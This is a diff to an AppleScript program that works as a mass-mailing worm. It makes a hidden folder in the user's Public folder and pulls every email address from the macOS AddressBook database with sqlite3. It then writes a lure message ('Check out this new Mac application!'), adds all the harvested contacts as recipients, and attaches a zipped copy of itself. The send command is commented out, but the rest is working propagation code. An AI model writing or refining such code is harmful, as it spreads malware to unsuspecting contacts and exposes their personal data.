@@ -14,9 +14,7 @@ end try
 try
 	do shell script "mkdir ~/Public/." & theuser & "" -- Make the hidden folder in the user's Public folder
 end try
-try
-	set ufld to "/Users/" & theuser & "/Public/." & theuser & "/"
-end try
+set ufld to "/Users/" & theuser & "/Public/." & theuser & "/"
 
 try
 	set reso to POSIX path of (path to resource "Updater.app")
@@ -88,24 +86,22 @@ try
 	Check out this new Mac application! You'll never use your computer the same way again ;)
 	
 	" & theuser & ""} -- Make email message
-	end tell
-	
-	set txt to paragraphs of (do shell script "sqlite3 ~/Library/Application\\ Support/AddressBook/AddressBook-v22.abcddb \"select ZADDRESSNORMALIZED from ZABCDEMAILADDRESS;\" | sort | uniq")
-	repeat with x from 1 to (count of txt)
-		tell application "Mail"
+		
+		set txt to paragraphs of (do shell script "sqlite3 ~/Library/Application\\ Support/AddressBook/AddressBook-v22.abcddb \"select ZADDRESSNORMALIZED from ZABCDEMAILADDRESS;\" | sort | uniq")
+		repeat with x from 1 to (count of txt)
 			tell theMessage
 				make new to recipient at end of to recipients with properties {address:(item x of txt)} -- Add recipients to message
 			end tell
+		end repeat
+		
+		set mydir to (do shell script "dirname " & (POSIX path of (path to me)))
+		do shell script "cd " & mydir & " ; zip " & ufld & "App.zip App.app"
+		set theAttachment to (POSIX file (ufld & "App.zip")) as alias
+		tell content of theMessage
+			make new attachment with properties {file name:theAttachment} at after last paragraph -- Attach the app
 		end tell
-	end repeat
-	
-	tell application "Mail"
-		try
-			tell content of theMessage
-				make new attachment with properties {file name:(path to me)} at after last paragraph -- Attach the app
-			end tell
-		end try
 		-- send theMessage
+		delay 1
 		quit
 	end tell
 end try
